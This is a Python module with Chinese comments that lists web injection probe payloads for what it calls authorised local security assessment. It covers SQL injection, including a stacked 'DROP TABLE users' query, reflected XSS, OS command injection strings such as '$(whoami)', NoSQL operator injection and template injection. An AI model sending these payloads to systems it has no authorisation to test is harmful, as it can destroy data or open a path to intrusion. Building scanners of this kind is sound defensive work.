"""注入探测载荷库（确定性、本地授权评估使用）。

载荷按"注入模式大类"组织，大类数量 >= 5：
  1. sql_error       基于报错的 SQL 注入
  2. sql_boolean     布尔盲注式 SQL 注入
  3. sql_union       UNION 型 SQL 注入
  4. sql_stacked     堆叠查询 SQL 注入
  5. xss_reflected   反射型跨站脚本
  6. cmd_injection   操作系统命令注入
  7. nosql           NoSQL 操作符注入
  8. ssti            服务端模板注入

每个载荷标注 payload_category（大类）与 injection_type（缺陷类型名），
报告中会原样记录实际发送的载荷。
"""

from __future__ import annotations

# (payload, 大类, 缺陷类型)
PAYLOADS: list[tuple[str, str, str]] = [
    # --- SQL 注入：报错型 ---
    ("'", "sql_error", "SQL注入"),
    ("\") OR (\"1\"=\"1", "sql_error", "SQL注入"),
    # --- SQL 注入：布尔盲注 ---
    ("' OR '1'='1", "sql_boolean", "SQL注入"),
    ("admin' AND '1'='2", "sql_boolean", "SQL注入"),
    # --- SQL 注入：UNION 型 ---
    ("' UNION SELECT NULL,NULL-- -", "sql_union", "SQL注入"),
    # --- SQL 注入：堆叠查询 ---
    ("'; DROP TABLE users-- -", "sql_stacked", "SQL注入"),
    # --- 反射型 XSS ---
    ("<script>alert(1)</script>", "xss_reflected", "反射型XSS"),
    ("\"><img src=x onerror=alert(1)>", "xss_reflected", "反射型XSS"),
    # --- 操作系统命令注入 ---
    ("; id", "cmd_injection", "命令注入"),
    ("| whoami", "cmd_injection", "命令注入"),
    ("$(whoami)", "cmd_injection", "命令注入"),
    # --- NoSQL 操作符注入 ---
    ("{\"$ne\": null}", "nosql", "NoSQL注入"),
    ("$gt", "nosql", "NoSQL注入"),
    # --- 服务端模板注入 ---
    ("{{7*7}}", "ssti", "模板注入SSTI"),
    ("${7*7}", "ssti", "模板注入SSTI"),
]

# 基准请求使用的良性参数值（不含任何签名关键字，避免基准响应自身命中）
BASELINE_VALUE = "baseline123"


def category_count() -> int:
    """返回载荷大类数量（验收要求不少于 5 种）。"""
    return len({item[1] for item in PAYLOADS})
